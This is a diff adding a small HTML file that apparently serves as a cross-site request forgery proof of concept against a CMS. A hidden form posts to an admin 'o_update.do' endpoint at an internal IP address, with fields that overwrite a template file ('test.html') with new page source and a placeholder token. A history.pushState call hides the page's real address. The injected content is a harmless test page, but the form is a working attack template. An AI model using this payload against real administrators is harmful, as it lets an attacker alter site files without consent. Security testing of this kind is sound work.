@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Test.html</title>
+<script>history.pushState('','','/')</script> 
+<form action="http://10.29.43.158:6001/pingce/cms/admin/resource/o_update.do" method="post">
+<input type = "hidden" name="root" value = "/pingce/tplresource/cms/www">
+<input type = "hidden" name="name" value = "/pingce/tplresource/cms/www/test.html">
+<input type = "hidden" name="source" value = "<html><body><title>test.html</title><p>测试页面</p></body></html>">
+<input type="hidden" name="token" id = "token" value="1111"/>
+<input type ="submit"  value = "submit request">
+
+
+</form>
+
+  </head>
+  
+  <body>
+    This is my HTML page. <br>
+  </body>
+</html>
